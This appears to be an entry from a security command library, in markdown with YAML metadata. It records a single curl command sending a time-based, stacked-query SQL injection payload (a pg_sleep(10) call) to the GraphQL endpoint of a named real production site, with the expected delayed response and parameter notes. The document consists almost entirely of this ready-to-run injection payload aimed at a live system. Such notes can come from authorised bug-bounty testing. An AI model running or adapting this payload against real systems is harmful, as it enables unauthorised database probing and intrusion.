---
data: >-
  time curl -X POST
  https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
tags:
  - sqli
  - timing
type: command
output: 'Response time ~10.557 seconds with {} JSON'
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:26:00.277Z'
id: eea3179c-3568-49af-a851-d9c0f400cbce
verified: false
validated: true
submitted: true
---
# time-curl-prod-10s

## Command

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
```

## Description

Times a 10-second pg_sleep for production SQLi verification.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Measure time | Yes |
| `curl` | Request sender | Yes |
| `embedded_submission_form_uuid` | 10s payload | Yes |

## Examples

### Basic Usage

```bash
time curl -X POST https://hackerone.com/graphql?embedded_submission_form_uuid=1%27%3BSELECT%201%3BSELECT%20pg_sleep%2810%29%3B--%27
```

## Expected Output

real 0m10.557s
{} JSON.

## Related

- [[Related Procedure: Verify-SQL-Injection-on-Production]]
